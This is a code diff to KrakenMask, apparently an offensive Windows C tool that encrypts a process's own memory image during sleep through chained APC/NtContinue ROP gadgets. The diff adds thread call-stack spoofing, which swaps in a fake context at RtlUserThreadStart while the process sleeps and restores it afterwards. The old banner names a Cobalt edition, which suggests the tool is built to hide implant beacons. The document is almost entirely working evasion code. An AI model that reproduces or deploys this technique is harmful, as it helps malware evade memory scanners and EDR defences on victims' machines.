@@ -4,10 +4,11 @@
 #include <Windows.h>
 #include "ntdll.h"
 
+
 #define MODULE_SIZE(x)      ((PIMAGE_NT_HEADERS)((UINT_PTR)x + ((PIMAGE_DOS_HEADER)x)->e_lfanew))->OptionalHeader.SizeOfImage
 
-typedef NTSTATUS(NTAPI* _NtAlertResumeThread)   (HANDLE, PULONG);
-typedef NTSTATUS(NTAPI* _NtSignalAndWaitForSingleObject) (HANDLE, HANDLE, BOOL, PLARGE_INTEGER);
+typedef NTSTATUS(NTAPI* _NtAlertResumeThread)               (HANDLE, PULONG);
+typedef NTSTATUS(NTAPI* _NtSignalAndWaitForSingleObject)    (HANDLE, HANDLE, BOOL, PLARGE_INTEGER);
 
 typedef struct _USTRING
 {
@@ -30,17 +31,9 @@ LPVOID lpGetGadgetJmpRdi(
     _In_    LPVOID  lpModuleAddr
 );
 
-
 VOID main()
 {
-    printf(" ____  __.              __                     _____                 __     ________     _______   \n");
-    printf("|    |/ _|___________  |  | __ ____   ____    /     \\ _____    _____|  | __ \\_____  \\    \\   _  \\  \n");
-    printf("|      < \\_  __ \\__  \\ |  |/ // __ \\ /    \\  /  \\ /  \\\\__  \\  /  ___/  |/ /  /  ____/    /  /_\\  \\ \n");
-    printf("|    |  \\ |  | \\/ __  \\|    <\\  ___/|   |  \\/    Y    \\/ __ \\_\\___ \\|    <  /       \\    \\  \\_/   \\\n");
-    printf("|____|__ \\|__|  (____  /__|_ \\\\___  >___|  /\\____|__  (____  /____  >__|_ \\ \\_______ \\ /\\ \\_____  /\n");
-    printf("        \\/           \\/     \\/    \\/     \\/         \\/     \\/     \\/     \\/         \\/ \\/       \\/ \n");
-    printf("\n\tBy @RtlDallas, KrakenMask 2.0\n");
-    printf("\tEdition : Cobalt l'AD REM sleep\n\n");
+    printf("\t[*] KrakenMask 2.2 by @RtlDallas\n");
 
     while (TRUE)
     {
@@ -67,10 +60,19 @@ VOID KrakenSleep(
     CONTEXT ctxRW       = { 0 };
     CONTEXT ctxEnc      = { 0 };
     CONTEXT ctxDelay    = { 0 };
+    CONTEXT ctxBackup   = { 0 };
+    CONTEXT ctxSpoof    = { 0 };
     CONTEXT ctxDec      = { 0 };
     CONTEXT ctxRWX      = { 0 };
+    CONTEXT ctxRestore  = { 0 };
     CONTEXT ctxEvent    = { 0 };
     CONTEXT ctxEnd      = { 0 };
+
+    CONTEXT ctxOg      = { 0 };
+    CONTEXT ctxFake    = { 0 };
+
+    ctxOg.ContextFlags      = CONTEXT_FULL;
+    ctxFake.ContextFlags    = CONTEXT_FULL;
 
     HANDLE hEventEnd    = CreateEventW(0, 0, 0, 0);
     HANDLE hEventSync   = CreateEventW(0, 0, 0, 0);
@@ -115,6 +117,9 @@ VOID KrakenSleep(
     LPVOID  lpTpReleaseCleanupGroupMembers      = (UINT_PTR)GetProcAddress(lpNtdll, "TpReleaseCleanupGroupMembers") + 0x450;
     LPVOID  lpNtAlertResumeThread               = GetProcAddress(lpNtdll, "NtAlertResumeThread");
     LPVOID  lpNtSignalAndWaitForSingleObject    = GetProcAddress(lpNtdll, "NtSignalAndWaitForSingleObject");
+    LPVOID  lpRtlUserThreadStart                = GetProcAddress(lpNtdll, "RtlUserThreadStart");
+    LPVOID  lpNtSetContextThread                = GetProcAddress(lpNtdll, "NtSetContextThread");
+    LPVOID  lpNtGetContextThread                = GetProcAddress(lpNtdll, "NtGetContextThread");
 
     if (!lpNtTestAlert || !lpRtlExitUserThread || !lpSystemFunction032 || !lpTpReleaseCleanupGroupMembers || !lpNtAlertResumeThread || !lpNtSignalAndWaitForSingleObject)
         return;
@@ -130,11 +135,21 @@ VOID KrakenSleep(
     LPVOID  lpFakeStackRWX = HeapAlloc(hKrakenHeap, HEAP_ZERO_MEMORY, 0x5000);
     ((UINT_PTR)lpFakeStackRWX) += 0x1000;
 
-    if (!lpFakeStackRWX || !lpFakeStackRW)
+    LPVOID  lpFakeStackSpoof = HeapAlloc(hKrakenHeap, HEAP_ZERO_MEMORY, 0x5000);
+
+
+    if (!lpFakeStackRWX || !lpFakeStackRW || !lpFakeStackSpoof)
         return;
 
     *(PULONG_PTR)lpFakeStackRW = (ULONG_PTR)lpRetGadget;
     *(PULONG_PTR)lpFakeStackRWX = (ULONG_PTR)lpRetGadget;
+       
+    ctxFake.Rip = lpRtlUserThreadStart;
+    ctxFake.Rsp = lpFakeStackSpoof;
+
+    HANDLE hCurrenThread = OpenThread(THREAD_ALL_ACCESS, TRUE, GetCurrentThreadId());
+    if (!hCurrenThread)
+        return;
 
     // Create thread
     DWORD dwTid = 0;
@@ -145,19 +160,21 @@ VOID KrakenSleep(
     if (hThread != NULL)
     {
         DWORD   dwOldProtect = 0;
-
         if (!GetThreadContext(hThread, &ctx))
             return;
-
+    
         memcpy(&ctxSync, &ctx, sizeof(CONTEXT));
         memcpy(&ctxRW, &ctx, sizeof(CONTEXT));
         memcpy(&ctxEnc, &ctx, sizeof(CONTEXT));
+        memcpy(&ctxBackup, &ctx, sizeof(CONTEXT));
+        memcpy(&ctxSpoof, &ctx, sizeof(CONTEXT));
         memcpy(&ctxDelay, &ctx, sizeof(CONTEXT));
         memcpy(&ctxDec, &ctx, sizeof(CONTEXT));
         memcpy(&ctxRWX, &ctx, sizeof(CONTEXT));
+        memcpy(&ctxRestore, &ctx, sizeof(CONTEXT));
         memcpy(&ctxEvent, &ctx, sizeof(CONTEXT));
         memcpy(&ctxEnd, &ctx, sizeof(CONTEXT));
-
+        
         ctxSync.Rip = lpJmpGadget;
         ctxSync.Rdi = WaitForSingleObject;
         ctxSync.Rcx = hEventSync;
@@ -178,6 +195,18 @@ VOID KrakenSleep(
         ctxEnc.Rdx = &uKey;
         *(PULONG_PTR)ctxEnc.Rsp = (ULONG_PTR)lpNtTestAlert;
 
+        ctxBackup.Rip = lpJmpGadget;
+        ctxBackup.Rdi = lpNtGetContextThread;
+        ctxBackup.Rcx = hCurrenThread;
+        ctxBackup.Rdx = &ctxOg;
+        *(PULONG_PTR)ctxBackup.Rsp = (ULONG_PTR)lpNtTestAlert;
+
+        ctxSpoof.Rip = lpJmpGadget;
+        ctxSpoof.Rdi = lpNtSetContextThread;
+        ctxSpoof.Rcx = hCurrenThread;
+        ctxSpoof.Rdx = &ctxFake;
+        *(PULONG_PTR)ctxSpoof.Rsp = (ULONG_PTR)lpNtTestAlert;
+
         ctxDelay.Rip = lpJmpGadget;
         ctxDelay.Rdi = WaitForSingleObject;
         ctxDelay.Rcx = (HANDLE)-1;
@@ -189,6 +218,12 @@ VOID KrakenSleep(
         ctxDec.Rcx = &uData;
         ctxDec.Rdx = &uKey;
         *(PULONG_PTR)ctxDec.Rsp = (ULONG_PTR)lpNtTestAlert;
+
+        ctxRestore.Rip = lpJmpGadget;
+        ctxRestore.Rdi = lpNtSetContextThread;
+        ctxRestore.Rcx = hCurrenThread;
+        ctxRestore.Rdx = &ctxOg;
+        *(PULONG_PTR)ctxRestore.Rsp = (ULONG_PTR)lpNtTestAlert;
 
         ctxRWX.Rip = lpJmpGadget;
         ctxRWX.Rdi = VirtualProtect;
@@ -211,7 +246,10 @@ VOID KrakenSleep(
         QueueUserAPC((PAPCFUNC)lpNtContinueGadget, hThread, &ctxSync);
         QueueUserAPC((PAPCFUNC)lpNtContinueGadget, hThread, &ctxRW);
         QueueUserAPC((PAPCFUNC)lpNtContinueGadget, hThread, &ctxEnc);
+        QueueUserAPC((PAPCFUNC)lpNtContinueGadget, hThread, &ctxBackup);
+        QueueUserAPC((PAPCFUNC)lpNtContinueGadget, hThread, &ctxSpoof);
         QueueUserAPC((PAPCFUNC)lpNtContinueGadget, hThread, &ctxDelay);
+        QueueUserAPC((PAPCFUNC)lpNtContinueGadget, hThread, &ctxRestore);
         QueueUserAPC((PAPCFUNC)lpNtContinueGadget, hThread, &ctxRWX);
         QueueUserAPC((PAPCFUNC)lpNtContinueGadget, hThread, &ctxDec);
         QueueUserAPC((PAPCFUNC)lpNtContinueGadget, hThread, &ctxEvent);
@@ -223,6 +261,7 @@ VOID KrakenSleep(
 
     }
 
+    CloseHandle(hCurrenThread);
     CloseHandle(hThread);
     CloseHandle(hEventEnd);
     CloseHandle(hEventSync);
@@ -230,8 +269,6 @@ VOID KrakenSleep(
 
     return;
 }
-
-
 
 LPVOID  lpGetGadgetlpNtTestAlert(
     _In_    LPVOID  lpModuleAddr
